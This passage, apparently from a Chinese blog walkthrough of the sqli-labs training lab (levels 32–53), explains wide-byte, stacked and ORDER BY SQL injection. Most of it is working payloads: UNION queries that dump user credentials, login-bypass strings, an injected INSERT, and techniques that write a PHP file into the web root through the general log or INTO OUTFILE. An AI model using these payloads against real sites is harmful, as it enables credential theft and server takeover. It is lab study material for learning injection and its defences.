class="line"></span><br></pre></td></tr></table></figure><p>宽字节注入原理：</p><ul><li>%df吃掉%5c：&#39; 进行url编码后为%5c%27，在%5c%27前添加%df，当MySQL的编码为GBK时（mysqli_query($con1, “SET NAMES gbk”);），%df%5c会被作为一个汉字，%27作为单引号独立，就可以逃脱%5c（\）的限制。</li><li>%5c吃掉%5c：将反斜杠作为字符，然后让%27（’）不受前面的%5c限制。（这里无法使用%5c）</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"># 简单测试</span><br><span class="line">?id&#x3D;1%df&#39; and sleep(3)--+</span><br><span class="line"># 有明显延时</span><br><span class="line">?id&#x3D;1%5c&#39; and sleep(3)--+</span><br><span class="line"># 没有延时</span><br><span class="line"></span><br><span class="line"># union注入</span><br><span class="line">?id&#x3D;-1%df&#39; union select 1,2,(SELECT+GROUP_CONCAT(username,password+SEPARATOR+0x3c62723e)+FROM+users)--+</span><br><span class="line"></span><br></pre></td></tr></table></figure><hr><h2 id="less-33"><a href="#less-33" class="headerlink" title="less-33"></a>less-33</h2><p>闭合方式：<code>id=&#39;$id&#39;</code><br>关键词：绕过 addslashes</p><p>类似上一题，不过采用 addslashes 函数添加反斜杠，Payload 同上一题</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">check_addslashes</span>(<span class="params">$string</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    $string= addslashes($string);    </span><br><span class="line">    <span class="keyword">return</span> $string;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>addslashes函数转义的字符</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">\   &#x3D;&gt;  \\</span><br><span class="line">&#39;   &#x3D;&gt;  \&#39;</span><br><span class="line">&quot;   &#x3D;&gt;  \&quot;</span><br><span class="line"></span><br></pre></td></tr></table></figure><hr><h2 id="less-34"><a href="#less-34" class="headerlink" title="less-34"></a>less-34</h2><p>闭合方式：<code>username=&#39;$uname&#39;</code></p><p>过滤方法同 less-33</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">$uname = addslashes($uname1);</span><br><span class="line">$passwd= addslashes($passwd1);</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>尝试注入</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"># union注入</span><br><span class="line">uname&#x3D;admin%df&#39; union select 1,(SELECT GROUP_CONCAT(username,password SEPARATOR 0x3c62723e) FROM users)#&amp;passwd&#x3D;233</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>还可以使用 UTF-16 或 UTF-32，效果同<code>%df</code></p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">~ » <span class="built_in">echo</span> \<span class="string">&#x27; | iconv -f utf-8 -t utf-16</span></span><br><span class="line"><span class="string">��&#x27;</span></span><br><span class="line">-------------------------------------------------------------</span><br><span class="line">~ » <span class="built_in">echo</span> \<span class="string">&#x27; | iconv -f utf-8 -t utf-32</span></span><br><span class="line"><span class="string">��&#x27;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>构造万能密码</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">uname&#x3D;�&#39; or 1#&amp;passwd&#x3D;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>在 MySQL 中执行的 SQL 语句</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">SELECT username, password FROM users WHERE username&#x3D;&#39;�&#39; or 1#and password&#x3D;&#39;$passwd&#39; LIMIT 0,1</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>这个符号的效果类似于 %df，进行联合注入</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">uname&#x3D;�&#39; and 1&#x3D;2 union select 1,(SELECT GROUP_CONCAT(username,password SEPARATOR 0x3c62723e) FROM users)#&amp;passwd&#x3D;</span><br><span class="line"></span><br></pre></td></tr></table></figure><hr><h2 id="less-35"><a href="#less-35" class="headerlink" title="less-35"></a>less-35</h2><p>闭合方式：<code>id=$id</code></p><p>这个关卡不需要使用单引号即可进行注入</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">?id&#x3D;-1 union select 1,2,(SELECT+GROUP_CONCAT(username,password+SEPARATOR+0x3c62723e)+FROM+security.users) --+</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="less-36"><a href="#less-36" class="headerlink" title="less-36"></a>less-36</h2><p>闭合方式：<code>id=&#39;$id&#39;</code></p><p>关键词：绕过 mysql_real_escape_string 函数</p><p>mysql_real_escape_string 函数类似 addslashes 函数，会对反斜杠、单引号、双引号进行检测并添加转义字符，所以方法和 less-34 一样</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">?id&#x3D;-1%df&#39; union select 1,2,(SELECT+GROUP_CONCAT(username,password+SEPARATOR+0x3c62723e)+FROM+security.users) --+ </span><br><span class="line">?id&#x3D;-1�&#39; union select 1,2,(SELECT+GROUP_CONCAT(username,password+SEPARATOR+0x3c62723e)+FROM+security.users) --+ </span><br><span class="line"></span><br></pre></td></tr></table></figure><hr><h2 id="less-37"><a href="#less-37" class="headerlink" title="less-37"></a>less-37</h2><p>闭合方式：<code>username=&#39;$uname&#39;</code></p><p>关键词：绕过 mysql_real_escape_string 函数</p><p>同上一题，GET 方法改为 POST 方法。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">uname&#x3D;%df&#39; and 1&#x3D;2 union select 1,(SELECT GROUP_CONCAT(username,password SEPARATOR 0x3c62723e) FROM users)#&amp;passwd&#x3D;</span><br><span class="line">uname&#x3D;�&#39; and 1&#x3D;2 union select 1,(SELECT GROUP_CONCAT(username,password SEPARATOR 0x3c62723e) FROM users)#&amp;passwd&#x3D;</span><br><span class="line"></span><br></pre></td></tr></table></figure><hr><h1 id="4-堆叠注入-38-53"><a href="#4-堆叠注入-38-53" class="headerlink" title="4 堆叠注入(38-53)"></a>4 堆叠注入(38-53)</h1><h2 id="less-38"><a href="#less-38" class="headerlink" title="less-38"></a>less-38</h2><p>闭合方式：<code>id=&#39;$id&#39;</code></p><p>添加字段值</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">?id&#x3D;1&#39;;insert into users(username,password) values (&#39;hello&#39;,&#39;world&#39;);</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>使用 SQL 语句进行查询是否添加成功</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">select * from users;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="DNSLog-数据外带"><a href="#DNSLog-数据外带" class="headerlink" title="DNSLog 数据外带"></a>DNSLog 数据外带</h3><p>条件：</p><ol><li>MySQL 开启 load_file()</li><li>DNSLog 平台 （Hyuga、CEYE）</li><li>Windows 平台</li></ol><p>无 windows 暂时不测试</p><h3 id="开启日志-Getshell"><a href="#开启日志-Getshell" class="headerlink" title="开启日志 Getshell"></a>开启日志 Getshell</h3><p>条件：</p><ol><li>Web 的物理路径</li><li>MySQL 可以读写 Web 目录</li><li>Windows 成功率 高于 Linux</li></ol><p>查看本地配置</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">mysql&gt; show variables like &#39;general%&#39;;</span><br><span class="line">+------------------+-----------------------------------------------------+</span><br><span class="line">| Variable_name    | Value                                               |</span><br><span class="line">+------------------+-----------------------------------------------------+</span><br><span class="line">| general_log      | OFF                                                 |</span><br><span class="line">| general_log_file | &#x2F;Applications&#x2F;MxSrvs&#x2F;bin&#x2F;mysql&#x2F;data&#x2F;MacBook-Pro.log |</span><br><span class="line">+------------------+-----------------------------------------------------+</span><br><span class="line">2 rows in set (0.00 sec)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>默认没有开启，尝试手动开启，并配置目录路径（我的项目路径为：/Users/littlechieh6/Documents/project/sqli-labs-php7）</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">?id&#x3D;1&#39;;set global general_log &#x3D; &quot;ON&quot;;set global general_log_file&#x3D;&#39;&#x2F;Users&#x2F;littlechieh6&#x2F;Documents&#x2F;project&#x2F;sqli-labs-php7&#x2F;shell.php&#39;;--+</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>再次查看配置</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">mysql&gt; show variables like &#39;general%&#39;;</span><br><span class="line">+------------------+----------------------------------------------------------------+</span><br><span class="line">| Variable_name    | Value                                                          |</span><br><span class="line">+------------------+----------------------------------------------------------------+</span><br><span class="line">| general_log      | ON                                                             |</span><br><span class="line">| general_log_file | &#x2F;Users&#x2F;littlechieh6&#x2F;Documents&#x2F;project&#x2F;sqli-labs-php7&#x2F;shell.php |</span><br><span class="line">+------------------+----------------------------------------------------------------+</span><br><span class="line">2 rows in set (0.00 sec)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>尝试 Getshell（运行的 sql 语句会被保存到我刚填写的日志路径，日志路径又在 web 路径之下，故可以得到 web shell）</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">?id&#x3D;1&#39;;select &#39;&lt;?php phpinfo();?&gt;&#39;;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>成功获取 phpinfo 信息（同理可以写马）<br><img src="https://blog-1256032382.cos.ap-nanjing.myqcloud.com/img/6843E733-D786-4480-866B-5CF4A778449A.png"></p><h3 id="修改表名查数据"><a href="#修改表名查数据" class="headerlink" title="修改表名查数据"></a>修改表名查数据</h3><p>具体细节搜索：supersqli 题解（攻防世界的题目）。</p><hr><h2 id="less-39"><a href="#less-39" class="headerlink" title="less-39"></a>less-39</h2><p>闭合方式：<code>id=$id</code></p><p>同38，闭合方式不同</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"># 测试payload</span><br><span class="line">?id&#x3D;1 and sleep(3)--+</span><br><span class="line"></span><br></pre></td></tr></table></figure><hr><h2 id="less-40"><a href="#less-40" class="headerlink" title="less-40"></a>less-40</h2><p>闭合方式：<code>id=(&#39;$id&#39;)</code></p><p>同38，闭合方式不同</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"># 测试</span><br><span class="line">?id&#x3D;1&#39;)--+</span><br><span class="line">?id&#x3D;1&#39;) and sleep(3)--+</span><br><span class="line"></span><br></pre></td></tr></table></figure><hr><h2 id="less-41"><a href="#less-41" class="headerlink" title="less-41"></a>less-41</h2><p>闭合方式：<code>id=$id</code></p><p>拼接方式和 Less-39 一样。因为少了报错输出，所以这里不能报错注入，其他注入方式一样</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"># 测试</span><br><span class="line">?id&#x3D;1--+</span><br><span class="line">?id&#x3D;1 and sleep(3)--+</span><br><span class="line"></span><br></pre></td></tr></table></figure><hr><h2 id="less-42"><a href="#less-42" class="headerlink" title="less-42"></a>less-42</h2><p>漏洞利用点：</p><ol><li>login 的 password：没有过滤，可以进行报错注入</li><li>堆叠注入</li><li>pass_change.php：存在二次注入<br>尝试万能密码（password），post 传参数<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"># 测试（url：http:&#x2F;&#x2F;localhost:4000&#x2F;Less-42&#x2F;login.php）</span><br><span class="line">login_user&#x3D;admin&amp;login_password&#x3D;1&#39; or 1#&amp;mysubmit&#x3D;Login</span><br><span class="line"></span><br><span class="line"># union注入</span><br><span class="line">login_user&#x3D;admin&amp;login_password&#x3D;1&#39; union select 1,(SELECT(@x)FROM(SELECT(@x:&#x3D;0x00) ,(SELECT(@x)FROM(users)WHERE(@x)IN(@x:&#x3D;CONCAT(0x20,@x,username,password,0x3c62723e))))x),3#&amp;mysubmit&#x3D;Login</span><br><span class="line"></span><br></pre></td></tr></table></figure></li></ol><hr><h2 id="less-43"><a href="#less-43" class="headerlink" title="less-43"></a>less-43</h2><p>闭合方式：<code>username=(&#39;$username&#39;)</code></p><p>和 Less-42 的利用方式一致，这里只是拼接方式不一样而已</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"># 测试（url：http:&#x2F;&#x2F;localhost:4000&#x2F;Less-43&#x2F;login.php）</span><br><span class="line">login_user&#x3D;admin&amp;login_password&#x3D;1&#39;) or 1#</span><br><span class="line"></span><br></pre></td></tr></table></figure><hr><h2 id="less-44"><a href="#less-44" class="headerlink" title="less-44"></a>less-44</h2><p>闭合方式：<code>username=&#39;$username&#39;</code></p><p>和 Less-43 的利用方式一致，因为没有输出报错信息，所以这里少了报错注入的利用方式。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"># 测试</span><br><span class="line">login_user&#x3D;admin&amp;login_password&#x3D;admin&#39; #</span><br><span class="line">login_user&#x3D;admin&amp;login_password&#x3D;admin&#39; and sleep(3) #</span><br><span class="line"></span><br></pre></td></tr></table></figure><hr><h2 id="less-45"><a href="#less-45" class="headerlink" title="less-45"></a>less-45</h2><p>闭合方式：<code>username=(&#39;$username&#39;)</code></p><p>和 Less-44 的利用方式一致，这里只是拼接方式不一样而已</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"># 测试</span><br><span class="line">login_user&#x3D;admin&amp;login_password&#x3D;admin&#39;) #</span><br><span class="line">login_user&#x3D;admin&amp;login_password&#x3D;admin&#39;) and sleep(3)#</span><br><span class="line"></span><br></pre></td></tr></table></figure><hr><h2 id="less-46"><a href="#less-46" class="headerlink" title="less-46"></a>less-46</h2><p>闭合方式：<code>ORDER BY $id</code></p><p>关键词：order by注入</p><p>验证方式</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"># 升序排序</span><br><span class="line">?sort&#x3D;1 asc</span><br><span class="line"># 降序排序</span><br><span class="line">?sort&#x3D;1 desc</span><br><span class="line"></span><br><span class="line"># rand() 验证</span><br><span class="line">?sort&#x3D;rand(true)</span><br><span class="line">?sort&#x3D;rand(false)</span><br><span class="line"></span><br><span class="line"># 延时验证</span><br><span class="line">?sort&#x3D;sleep(1)</span><br><span class="line">?sort&#x3D;(sleep(1))</span><br><span class="line">?sort&#x3D;1 and sleep(1)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>报错注入</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"># 报错1</span><br><span class="line">?sort&#x3D;1+AND+(SELECT+1+FROM+(SELECT+COUNT(*),CONCAT((SELECT(SELECT+CONCAT(CAST(CONCAT(username,password)+AS+CHAR),0x7e))+FROM+users+LIMIT+0,1),FLOOR(RAND(0)*2))x+FROM+INFORMATION_SCHEMA.TABLES+GROUP+BY+x)a)</span><br><span class="line"></span><br><span class="line"># 报错2</span><br><span class="line">?sort&#x3D;1 procedure analyse(extractvalue(rand(),concat(0x3a,version())),1)</span><br><span class="line">?sort&#x3D;1 procedure analyse(extractvalue(rand(),concat(0x3a,(SELECT+CONCAT_WS(&#39;:&#39;,username,password)+FROM+users limit 0,1))),1)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>布尔注入</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">?sort&#x3D;rand(left(database(),1)&gt;&#39;r&#39;)</span><br><span class="line">?sort&#x3D;rand(left(database(),1)&gt;&#39;s&#39;)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>延时注入</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">?sort&#x3D;rand(if(ascii(substr(database(),1,1))&gt;114,1,sleep(1)))</span><br><span class="line">?sort&#x3D;rand(if(ascii(substr(database(),1,1))&gt;115,1,sleep(1)))</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>查询结果导入文件</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">?sort&#x3D;1 into outfile &quot;&#x2F;var&#x2F;www&#x2F;html&#x2F;less46.txt&quot;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>导入文件写入shell</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">?sort&#x3D;1 into outfile &quot;&#x2F;Users&#x2F;littlechieh6&#x2F;Documents&#x2F;project&#x2F;sqli-labs-php7&#x2F;less46.php&quot; lines terminated by 0x3c3f70687020706870696e666f28293b3f3e</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>写入的内容如下</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">1 Dumb Dumb&lt;?php phpinfo();?&gt;2 Angelina Dumb&lt;?php phpinfo();?&gt;3 Dummy Dumb&lt;?php phpinfo();?&gt;4 secure Dumb&lt;?php phpinfo();?&gt;5 stupid Dumb&lt;?php phpinfo();?&gt;6 superman Dumb&lt;?php phpinfo();?&gt;7 batman Dumb&lt;?php phpinfo();?&gt;8 admin admin&lt;?php phpinfo();?&gt;9 admin1 Dumb&lt;?php phpinfo();?&gt;10 admin2 Dumb&lt;?php phpinfo();?&gt;11 admin3 Dumb&lt;?php phpinfo();?&gt;12 dhakkan Dumb&lt;?php phpinfo();?&gt;14 admin4 Dumb&lt;?php phpinfo();?&gt;15 admin&#39;# admin&lt;?php phpinfo();?&gt;16 hello world&lt;?php phpinfo();?&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure><hr><h2 id="less-47"><a href="#less-47" class="headerlink" title="less-47"></a>less-47</h2><p>闭合方式：<code>ORDER BY &#39;$id&#39;</code></p><p>和 Less-46 相比，利用方式不变，只是拼接方式方式变化，注入的时候只要正常闭合即可。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"># 验证</span><br><span class="line"></span><br><span class="line">?sort&#x3D;1&#39; or sleep(3)--+</span><br><span class="line">?sort&#x3D;0&#39; or sleep(3)--+</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>由于短路现象，前一个不会发生延时，后一个有明显的延时。</p><p>报错注入</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">?sort&#x3D;0&#39; or updatexml(1, concat(0x7e, database(), 0x7e), 1)--+</span><br><span class="line"></span><br></pre></td></tr></table></figure><hr><h2 id="less-48"><a href="#less-48" class="headerlink" title="less-48"></a>less-48</h2><p>闭合方式：<code>order by $id</code></p><p>和 Less-47 相比少了报错注入，布尔、延时盲注依然可以正常使用，into outfile 也可以</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"># 测试：</span><br><span class="line">?sort&#x3D;1</span><br><span class="line">?sort&#x3D;1--+</span><br><span class="line">?sort&#x3D;1 or sleep(3)--+ # 无延时</span><br><span class="line">?sort&#x3D;0 or sleep(3)--+ # 有延时</span><br><span class="line"></span><br></pre></td></tr></table></figure><hr><h2 id="less-49"><a href="#less-49" class="headerlink" title="less-49"></a>less-49</h2><p>闭合方式：<code>ORDER BY &#39;$id&#39;</code></p><p>和 <code>Less-47</code> 相比少了报错注入，布尔、延时盲注依然可以正常使用，<code>into outfile</code> 也可以</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"># 测试</span><br><span class="line">?sort&#x3D;1        # 正常排序</span><br><span class="line">?sort&#x3D;1--+     # 正常排序</span><br><span class="line">?sort&#x3D;1 or sleep(3)--+ # 无延时</span><br><span class="line">?sort&#x3D;0 or sleep(3)--+ # 无延时</span><br><span class="line"># 说明闭合方式不是 order by $id</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">?sort&#x3D;1&#39;        # 不正常排序</span><br><span class="line">?sort&#x3D;1&#39;--+     # 正常排序</span><br><span class="line">?sort&#x3D;0&#39; or sleep(3)--+ # 有延时</span><br><span class="line">?sort&#x3D;1&#39; or sleep(3)--+ # 无延时</span><br><span class="line"></span><br></pre></td></tr></table></figure><hr><h2 id="less-50"><a href="#less-50" class="headerlink" title="less-50"></a>less-50</h2><p>闭合方式：<code>ORDER BY $id</code></p><p>和 Less-46 相比，查询方式由 mysql_query 变成了 mysqli_multi_query，因此支持堆叠注入，在注入方面会更加灵活。</p><p>关键代码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">$sql=<span class="string">&quot;SELECT * FROM users ORDER BY <span class="subst">$id</span>&quot;</span>;</span><br><span class="line"><span class="comment"># 堆叠注入 </span></span><br><span class="line">mysqli_multi_query($con1, $sql)</span><br><span class="line"><span class="comment"># 打印错误</span></span><br><span class="line">print_r(mysqli_error($con1));</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>尝试注入</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"># 测试</span><br><span class="line">?sort&#x3D;0 or updatexml(1, concat(0x7e, database(), 0x7e), 1)--+ </span><br><span class="line"># XPATH syntax error: &#39;~security~&#39;</span><br><span class="line"></span><br></pre></td></tr></table></figure><hr><h2 id="less-51"><a href="#less-51" class="headerlink" title="less-51"></a>less-51</h2><p>闭合方式：<code>ORDER BY &#39;$id&#39;</code></p><p>和 Less-50 相比只是拼接方式发生了变化，实际注入的时候只需做一下对应的闭合即可。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">?sort&#x3D;1        # 正常排序</span><br><span class="line">?sort&#x3D;1--+     # 正常排序（&#39;1--+&#39;被强制类型转换为1）</span><br><span class="line">?sort&#x3D;1&#39;       # 报错，order by &#39;1&#39;&#39;</span><br><span class="line">?sort&#x3D;1&#39;--+    # 正常排序（order by &#39;1&#39;-- &#39;）</span><br><span class="line"></span><br><span class="line"># 报错注入</span><br><span class="line">?sort&#x3D;1&#39; and updatexml(1, concat(0x7e, database(), 0x7e), 1)--+</span><br><span class="line"></span><br></pre></td></tr></table></figure><hr><h2 id="less-52"><a href="#less-52" class="headerlink" title="less-52"></a>less-52</h2><p>闭合方式：<code>ORDER BY $id</code></p><p>和 Less-50 是一样的，只是少了报错注入的利用方式。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">?sort&#x3D;1       # 正常回显</span><br><span class="line">?sort&#x3D;1--+    # 正常回显</span><br><span class="line">?sort&#x3D;1&#39;      # 不显示（order by 1&#39;，出错但是没有显示报错信息） </span><br><span class="line">?sort&#x3D;1&#39;--+   # 不显示（order by 1&#39;--+，出错但是没有显示报错信息）</span><br><span class="line"></span><br><span class="line"># 验证</span><br><span class="line">?sort&#x3D;0 or sleep(3)--+</span><br><span class="line"># 有明显延时</span><br><span class="line"></span><br><span class="line"># 布尔注入</span><br><span class="line">?sort&#x3D;rand(left(database(),1)&gt;&#39;s&#39;)</span><br><span class="line">?sort&#x3D;rand(left(database(),1)&gt;&#39;r&#39;)</span><br><span class="line"></span><br></pre></td></tr></table></figure><hr><h2 id="Less-53"><a href="#Less-53" class="headerlink" title="Less-53"></a>Less-53</h2><p>闭合方式：<code>ORDER BY &#39;$id&#39;</code></p><p>和 Less-51 是一样的，只是少了报错注入的利用方式。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span 